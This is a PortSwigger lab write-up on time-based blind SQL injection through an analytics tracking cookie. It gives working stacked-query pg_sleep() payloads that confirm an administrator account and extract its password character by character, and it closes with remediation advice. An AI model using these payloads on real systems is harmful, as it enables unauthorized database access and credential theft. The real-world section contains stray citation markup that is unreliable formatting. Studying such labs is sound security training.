## Goal: 
This lab contains a sql injection vulnerability. The application uses a tracking cookie for analytics and performs sql query containing the submitted cookie.

## Lab details
Lab: Blind SQL injection with time delays and information retrieval

Level: Practitioner

Vulnerability Class: SQL Injection — Blind

Lab URL: [\[PortSwigger lab link\]](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)

Date Completed: 5-aug-2026

Time to Solve: 1 hour

## Vulnerability Summary
The application embeds the value of the TrackingId cookie directly into a backend SQL query used for analytics, without sanitization or parameterization. The query's results are never rendered in the response, and the application returns an identical, generic response regardless of whether the injected condition is true, false, or causes a database error — leaving no visible output or error channel to exploit. However, because the query executes synchronously before the response is returned, an attacker can inject conditional logic that triggers a measurable delay (via pg_sleep()) when a condition holds true. Timing becomes the sole observable side channel. In a production application, this allows an unauthenticated attacker to extract arbitrary data — including credentials — one inferred bit at a time, and to enumerate the database schema to support further, more targeted attacks.

## Reconnaissance
I began by sending a baseline request through Burp Suite Repeater to identify the injection point and confirm how the backend responds to malformed and conditional input.

Indicators observed:

1. Appending a single quote (') to the TrackingId cookie produced no visible error and no change in the response — indicating the value likely reaches the SQL parser, but the application suppresses any resulting database error rather than surfacing it.
2. Since the application gave no visible feedback even on a malformed query, I could not rely on content or status-code differences to confirm injection. I instead tested for a measurable time delay, since the query appeared to execute synchronously.
3. A raw, unencoded semicolon-based payload produced no delay. Because ; is a reserved delimiter in the Cookie header (it separates cookie name/value pairs), the browser or server truncated the value at the first semicolon before it reached the application — the payload never arrived intact.
4. URL-encoding the semicolon (%3B) allowed the full payload to reach the backend. A 10-second delay confirmed the injected statement executed successfully.
5. Wrapping the delay in a conditional referencing username = `'administrator'` and observing the same delay confirmed a matching row exists in the users table.
6. Extending the condition with `length(password) > x` and testing increasing values of x bisected the password length; a delay stopped occurring above 20, confirming a 20-character password.
7. With the length known, I used `substring(password, n, 1) = '_char_'` to test each character position individually, automating the search with Burp Suite Intruder.

## Exploitation — Step by Step
### Step 1: Test for a database-level reaction to malformed input
Payload:
```text
'
```
The application responded with 200 OK and no visible change in content, confirming there is no visible error channel — any injection would need to be confirmed through a different observable signal.

### Step 2: Attempt a stacked, conditional time-delay payload
Payload:
```text
';select case when (1=1) then pg_sleep(10) else pg_sleep(0) END--
```
The application responded immediately, with no delay. This was expected once I considered how cookies are transmitted: cookie values travel inside the `Cookie` HTTP header, where `;` is a reserved separator between cookie pairs, not a literal character. Because the payload wasn't encoded, the browser or intermediary likely interpreted everything from the semicolon onward as a separate cookie declaration (or discarded it outright), so the application only ever received a truncated value ending at `TrackingId='`.

### Step 3: Encode the payload for correct delivery
Payload:
```text
'%3Bselect+case+when+(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+END--
```
Probable SQL query:
```sql
SELECT data FROM analytics WHERE cookie = '';select case when (1=1) then pg_sleep(10) else pg_sleep(0) END--
```
Percent-encoding the semicolon preserved the full value through transit. The response was delayed by approximately 10 seconds, confirming a working, syntactically valid stacked-query injection.

### Step 4: Confirm the administrator account exists
Payload:
```text
'%3Bselect+case+when+(username='administrator')+then+pg_sleep(10)+else+pg_sleep(0)+END+from users--
```
The 10-second delay confirmed a row with `username = 'administrator'` exists in the `users` table.

### Step 5: Determine the password length
 
Payload:
```text
'%3Bselect+case+when+(username='administrator' and length(password)>10)+then+pg_sleep(10)+else+pg_sleep(0)+END+from users--
```

I tested several threshold values (10, 15, 20, 25) and observed the delay stopped occurring once the threshold exceeded 20, confirming the administrator's password is exactly 20 characters long.

### Step 6: Extract the password character by character
Payload template (used with Burp Suite Intruder):
```text
'%3Bselect+case+when+(username='administrator' and substring(password, 1, 1) = '_character_')+then+pg_sleep(10)+else+pg_sleep(0)+END+from users--
```
Using a payload set of lowercase letters and digits against the `_character_` position marker, and iterating the substring offset across all 20 positions, I identified each character based on which requests returned a 10-second delay versus an immediate response.

### Key Payload(s)
Used to confirm the administrator account:
```text
'%3Bselect+case+when+(username='administrator')+then+pg_sleep(10)+else+pg_sleep(0)+END+from+users--
```
 
Used to extract the password one character at a time:
```text
'%3Bselect+case+when+(username='administrator'+and+substring(password,1,1)='_character_')+then+pg_sleep(10)+else+pg_sleep(0)+END+from+users--
```

### Tools Used

 Manual (Burp Suite Repeater)
 Burp Suite Intruder


## The Fix
The root cause is string concatenation of untrusted input (the `TrackingId` cookie) into a SQL statement, combined with a driver/database configuration that permits stacked (batched) queries from a single input. The primary remediation is a parameterized query on the analytics lookup itself:

Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```

Additional mitigations:

**Disable stacked queries where not required:** Many database drivers allow multiple statements to be batched in a single call by default. Unless the application genuinely needs this, disabling it (e.g., `multipleStatements: false` in Node's MySQL driver, or the equivalent connection setting) removes an entire exploitation path even if an injection point exists elsewhere.
- **Least-privilege database account:** The application's database user should not have access to unrelated tables (e.g., `users`) from the analytics code path, and should not be able to execute `pg_sleep()` or other administrative functions.
- **Input validation:** Whitelist the expected format of the tracking ID (e.g., fixed-length alphanumeric) so malformed or structurally unusual values are rejected before reaching the query layer.
- **Secure credential storage:** Passwords should be hashed with a strong, salted algorithm (bcrypt or Argon2id) and verified in application code after retrieval — never compared directly within a SQL statement — so that even a successful injection does not yield usable plaintext credentials.
- **Response-time monitoring:** Since this class of vulnerability is invisible to content-based detection, logging and alerting on anomalously slow responses to a given endpoint can help surface time-based injection attempts that would otherwise leave no trace in application logs.



## What I Found Interesting / Unexpected
The most notable part of this lab was realizing that the application's total silence — no errors, no content differences, no status code variation — doesn't mean the injection point is unusable, only that the exfiltration channel has to be timing rather than content. It also reinforced that HTTP transport mechanics matter as much as SQL syntax: the initial failed payload wasn't a SQL problem at all, it was a cookie-encoding problem, since the semicolon delimiter in the `Cookie` header truncated the payload before it ever reached the database. That's a distinct class of mistake from getting the SQL itself wrong, and one I hadn't previously had to reason through.

## Real-World Relevance
Time-based blind SQL injection remains a live issue outside of training labs. In January 2025, attackers used a SQL injection flaw in PostgreSQL, tracked as <cite index="25-1">CVE-2025-1094, to breach BeyondTrust's Remote Support platform, with the intrusion chain eventually reaching the U.S. Treasury Department</cite>. It's a concrete example of how a database-level injection flaw, not fundamentally different in kind from this lab's cookie parameter, can cascade into a nation-state-relevant breach.
 
Blind and time-based SQL injection are also still a disclosed, bounty-paying class of finding against high-value production targets. Public HackerOne disclosure records list <cite index="26-1">a time-based blind SQL injection report against the U.S. Department of Defense</cite>, demonstrating that this exact technique — inferring data purely from response timing — continues to surface in hardened, actively-monitored environments.


## Connections to My Own Projects
tbd

## Takeaway
**For developers:** The absence of visible errors or content differences is not evidence of safety — if input reaches a query unparameterized, it's exploitable regardless of what the response looks like. Cookies, headers, and other "invisible" parameters deserve the same scrutiny as form fields, since they're just as attacker-controlled.
 
**For AppSec:** Blind, timing-based attacks are largely invisible to content-based detection and typical application logs, which makes them easy to miss in a security review that only checks for error leakage or reflected output. Layer defenses accordingly: parameterized queries remove the root cause, disabling stacked queries removes a specific exploitation technique, and response-time monitoring provides a detective control for anything that slips through.